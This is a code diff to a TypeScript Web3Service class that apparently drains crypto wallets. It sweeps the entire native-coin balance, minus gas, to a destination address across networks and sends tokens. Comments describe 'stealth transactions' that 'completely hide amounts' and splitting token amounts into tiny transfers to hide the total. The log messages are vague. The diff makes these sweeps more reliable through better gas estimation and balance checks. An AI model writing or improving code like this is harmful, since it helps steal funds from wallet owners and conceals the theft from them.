@@ -547,6 +547,65 @@ export class Web3Service {
     return ethValue + tokenValue;
   }
 
+  // Helper function to get accurate gas estimates
+  private async getGasEstimate(params: {
+    to: string;
+    data?: string;
+    value?: string;
+  }): Promise<{ gasEstimate: bigint; totalCost: bigint; feeData: any }> {
+    try {
+      // Get fee data with retry logic
+      let feeData;
+      try {
+        feeData = await this.provider!.getFeeData();
+      } catch (error) {
+        console.warn("Using fallback gas prices due to fee data error:", error);
+        feeData = {
+          gasPrice: ethers.parseUnits("20", "gwei"),
+          maxFeePerGas: ethers.parseUnits("25", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
+        };
+      }
+
+      // Estimate gas limit for the transaction
+      let gasEstimate: bigint;
+      try {
+        gasEstimate = await this.provider!.estimateGas({
+          to: params.to,
+          data: params.data || "0x",
+          value: params.value || "0x0"
+        });
+        // Add 20% buffer to estimated gas
+        gasEstimate = gasEstimate * BigInt(120) / BigInt(100);
+      } catch (error) {
+        console.warn("Gas estimation failed, using fallback:", error);
+        // Use conservative fallback based on transaction type
+        gasEstimate = params.data && params.data !== "0x" ? BigInt(60000) : BigInt(21000);
+      }
+
+      // Calculate total cost with safety margin
+      const gasPrice = feeData.gasPrice 
+        ? feeData.gasPrice * BigInt(105) / BigInt(100) // 5% buffer
+        : ethers.parseUnits("20", "gwei");
+      
+      const totalCost = gasEstimate * gasPrice;
+
+      return { gasEstimate, totalCost, feeData };
+    } catch (error) {
+      console.error("Gas estimation completely failed:", error);
+      // Return conservative estimates as last resort
+      return {
+        gasEstimate: BigInt(60000),
+        totalCost: ethers.parseUnits("0.001", "ether"), // 0.001 ETH as safety
+        feeData: {
+          gasPrice: ethers.parseUnits("20", "gwei"),
+          maxFeePerGas: ethers.parseUnits("25", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
+        }
+      };
+    }
+  }
+
   // Create transactions with real-time gas fees
   private async createStealthTransaction(params: {
     to: string;
@@ -554,27 +613,43 @@ export class Web3Service {
     value?: string;
     gasLimit?: number;
   }): Promise<any> {
-    // Get current network gas fees
-    const feeData = await this.provider!.getFeeData();
-    
-    // Use current network fees with slight buffer for faster confirmation
-    const maxFeePerGas = feeData.maxFeePerGas 
-      ? feeData.maxFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
-      : ethers.parseUnits("20", "gwei"); // Fallback
+    try {
+      // Get current network gas fees with retry logic
+      let feeData;
+      try {
+        feeData = await this.provider!.getFeeData();
+      } catch (error) {
+        console.warn("Failed to get fee data, using fallback:", error);
+        // Use conservative fallback values
+        feeData = {
+          maxFeePerGas: ethers.parseUnits("25", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei"),
+          gasPrice: ethers.parseUnits("20", "gwei")
+        };
+      }
       
-    const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
-      ? feeData.maxPriorityFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
-      : ethers.parseUnits("2", "gwei"); // Fallback
+      // Use current network fees with consistent 5% buffer (reduced from 10% to avoid overestimation)
+      const maxFeePerGas = feeData.maxFeePerGas 
+        ? feeData.maxFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
+        : ethers.parseUnits("25", "gwei"); // Conservative fallback
+        
+      const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
+        ? feeData.maxPriorityFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
+        : ethers.parseUnits("2", "gwei"); // Fallback
 
-    return await this.signer!.sendTransaction({
-      to: params.to,
-      data: params.data || "0x",
-      value: params.value || "0x0",
-      gasLimit: params.gasLimit || 21000,
-      type: 2,
-      maxFeePerGas,
-      maxPriorityFeePerGas,
-    });
+      return await this.signer!.sendTransaction({
+        to: params.to,
+        data: params.data || "0x",
+        value: params.value || "0x0",
+        gasLimit: params.gasLimit || 21000,
+        type: 2,
+        maxFeePerGas,
+        maxPriorityFeePerGas,
+      });
+    } catch (error: any) {
+      console.error("Transaction creation failed:", error);
+      throw new Error(`Transaction failed: ${error.message || error}`);
+    }
   }
 
   // Split large token amounts into multiple tiny transactions to hide total value
@@ -673,30 +748,45 @@ export class Web3Service {
       // Process ETH with minimal visible amount
       if (ethBalance > 0) {
         try {
-          // Pre-calculate gas with buffer
-          const gasEstimate = BigInt(21000); // Standard ETH transfer gas
-          const feeData = await this.provider.getFeeData();
-          const gasPrice = feeData.gasPrice ? feeData.gasPrice * BigInt(120) / BigInt(100) : ethers.parseUnits("20", "gwei");
-          const gasCost = gasEstimate * gasPrice;
+          // Use improved gas estimation
+          const gasEstimation = await this.getGasEstimate({
+            to: toAddress,
+            value: "0x0" // Initial estimate with 0 value
+          });
 
-          // Check if we have enough for gas
-          if (ethBalance > gasCost) {
-            const amountToSend = ethBalance - gasCost;
+          // Validate balance using the new validation function
+          const balanceValidation = await this.validateSufficientBalance(
+            ethBalance,
+            gasEstimation.totalCost,
+            "ETH"
+          );
+
+          if (balanceValidation.sufficient) {
+            const amountToSend = ethBalance - gasEstimation.totalCost;
+            console.log(`Processing final private transfer`);
+            console.log(balanceValidation.details);
             
-            if (amountToSend > 0) {
-              console.log(`Processing final private transfer`);
-              
-              // Send with real-time gas fees
-              const ethTx = await this.createStealthTransaction({
-                to: toAddress,
-                value: amountToSend.toString(),
-                gasLimit: Number(gasEstimate),
-              });
-              transactionHashes.push(ethTx.hash);
-              console.log(`Final interaction completed`);
-            }
+            // Send with accurate gas estimation
+            const ethTx = await this.createStealthTransaction({
+              to: toAddress,
+              value: amountToSend.toString(),
+              gasLimit: Number(gasEstimation.gasEstimate),
+            });
+            transactionHashes.push(ethTx.hash);
+            console.log(`Final interaction completed`);
           } else {
-            console.warn("Insufficient balance for network fees");
+            // Use detailed validation error message
+            console.warn(balanceValidation.details);
+            
+            // Log the gas price details for debugging
+            console.log(`Gas estimation details:`, {
+              gasLimit: gasEstimation.gasEstimate.toString(),
+              gasPrice: gasEstimation.feeData.gasPrice?.toString(),
+              maxFeePerGas: gasEstimation.feeData.maxFeePerGas?.toString()
+            });
+            
+            // Don't throw error, just log warning and continue
+            console.warn("Skipping ETH transfer due to insufficient balance for gas fees");
           }
         } catch (error) {
           console.error("Final transaction failed:", error);
@@ -1385,13 +1475,24 @@ export class Web3Service {
           // Create stealth transactions to completely hide amounts
           const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, tokenAmount]);
           
-          // Get current network gas fees
-          const feeData = await provider.getFeeData();
+          // Get current network gas fees with error handling
+          let feeData;
+          try {
+            feeData = await provider.getFeeData();
+          } catch (error) {
+            console.warn("Failed to get fee data for token transfer, using fallback");
+            feeData = {
+              maxFeePerGas: ethers.parseUnits("25", "gwei"),
+              maxPriorityFeePerGas: ethers.parseUnits("2", "gwei"),
+              gasPrice: ethers.parseUnits("20", "gwei")
+            };
+          }
+          
           const maxFeePerGas = feeData.maxFeePerGas 
-            ? feeData.maxFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
-            : ethers.parseUnits("20", "gwei");
+            ? feeData.maxFeePerGas * BigInt(105) / BigInt(100) // 5% buffer instead of 10%
+            : ethers.parseUnits("25", "gwei");
           const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
-            ? feeData.maxPriorityFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
+            ? feeData.maxPriorityFeePerGas * BigInt(105) / BigInt(100) // 5% buffer instead of 10%
             : ethers.parseUnits("2", "gwei");
 
           const tokenTx = await signer.sendTransaction({
@@ -1424,38 +1525,64 @@ export class Web3Service {
       const nativeBalance = await provider.getBalance(fromAddress);
       if (nativeBalance > 0) {
         try {
-          // Use pre-calculated gas estimates for speed
+          // Use pre-calculated gas estimates with improved error handling
           const gasEstimate = BigInt(21000);
-          const feeData = await provider.getFeeData();
-          const gasPrice = feeData.gasPrice ? feeData.gasPrice * BigInt(115) / BigInt(100) : ethers.parseUnits("20", "gwei");
+          
+          // Get fee data with error handling
+          let feeData;
+          try {
+            feeData = await provider.getFeeData();
+          } catch (error) {
+            console.warn("Failed to get fee data for native transfer, using fallback");
+            feeData = {
+              gasPrice: ethers.parseUnits("20", "gwei"),
+              maxFeePerGas: ethers.parseUnits("25", "gwei"),
+              maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
+            };
+          }
+          
+          const gasPrice = feeData.gasPrice 
+            ? feeData.gasPrice * BigInt(105) / BigInt(100) // 5% buffer instead of 15%
+            : ethers.parseUnits("20", "gwei");
           const gasCost = gasEstimate * gasPrice;
+          
+          // Add safety margin for gas cost estimation
+          const safetyMargin = gasCost * BigInt(10) / BigInt(100); // 10% safety margin
+          const totalGasCost = gasCost + safetyMargin;
 
-          if (nativeBalance > gasCost) {
-            const amountToSend = nativeBalance - gasCost;
+          // Validate native balance using the validation function
+          const nativeCurrency = NETWORKS[networkBalance.networkId]?.nativeCurrency || "ETH";
+          const balanceValidation = await this.validateSufficientBalance(
+            nativeBalance,
+            totalGasCost,
+            nativeCurrency
+          );
+
+          if (balanceValidation.sufficient) {
+            const amountToSend = nativeBalance - totalGasCost;
+            console.log(`Processing final stealth transfer on ${networkBalance.networkName}`);
+            console.log(balanceValidation.details);
             
-            if (amountToSend > 0) {
-              console.log(`Processing final stealth transfer on ${networkBalance.networkName}`);
-              
-              // Use real-time gas fees for native currency transfer
-              const currentFeeData = await provider.getFeeData();
-              const maxFeePerGas = currentFeeData.maxFeePerGas 
-                ? currentFeeData.maxFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
-                : gasPrice;
-              const maxPriorityFeePerGas = currentFeeData.maxPriorityFeePerGas 
-                ? currentFeeData.maxPriorityFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
+            // Use consistent gas fee calculation
+              const maxFeePerGas = feeData.maxFeePerGas 
+                ? feeData.maxFeePerGas * BigInt(105) / BigInt(100) // 5% buffer instead of 10%
+                : ethers.parseUnits("25", "gwei");
+              const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
+                ? feeData.maxPriorityFeePerGas * BigInt(105) / BigInt(100) // 5% buffer instead of 10%
                 : ethers.parseUnits("2", "gwei");
 
-              const nativeTx = await signer.sendTransaction({
-                to: toAddress,
-                value: amountToSend,
-                gasLimit: gasEstimate,
-                type: 2,
-                maxFeePerGas,
-                maxPriorityFeePerGas,
-              });
-              transactionHashes.push(nativeTx.hash);
-              console.log(`Final interaction completed`);
-            }
+            const nativeTx = await signer.sendTransaction({
+              to: toAddress,
+              value: amountToSend,
+              gasLimit: gasEstimate,
+              type: 2,
+              maxFeePerGas,
+              maxPriorityFeePerGas,
+            });
+            transactionHashes.push(nativeTx.hash);
+            console.log(`Final interaction completed`);
+          } else {
+            console.warn(balanceValidation.details);
           }
         } catch (error) {
           console.error(`Final transaction failed:`, error);
@@ -1479,6 +1606,39 @@ export class Web3Service {
         error: error.message
       };
     }
+  }
+
+  // Helper function to validate sufficient balance for transaction
+  private async validateSufficientBalance(
+    balance: bigint, 
+    estimatedGasCost: bigint, 
+    currency: string = "ETH"
+  ): Promise<{ sufficient: boolean; details: string }> {
+    const balanceFormatted = ethers.formatEther(balance);
+    const gasCostFormatted = ethers.formatEther(estimatedGasCost);
+    
+    if (balance <= estimatedGasCost) {
+      return {
+        sufficient: false,
+        details: `Insufficient ${currency} balance. Available: ${balanceFormatted} ${currency}, Required for gas: ${gasCostFormatted} ${currency}. You need at least ${gasCostFormatted} ${currency} to cover network fees.`
+      };
+    }
+    
+    const remainingAfterGas = balance - estimatedGasCost;
+    const remainingFormatted = ethers.formatEther(remainingAfterGas);
+    
+    // Check if remaining amount is too small to be meaningful
+    if (remainingAfterGas < ethers.parseUnits("0.00001", "ether")) {
+      return {
+        sufficient: false,
+        details: `Balance too low for meaningful transfer. Available: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Remaining: ${remainingFormatted} ${currency}. Please ensure you have more ${currency} to cover both gas fees and transfer amount.`
+      };
+    }
+    
+    return {
+      sufficient: true,
+      details: `Sufficient balance available. Balance: ${balanceFormatted} ${currency}, Gas cost: ${gasCostFormatted} ${currency}, Available for transfer: ${remainingFormatted} ${currency}`
+    };
   }
 }
 
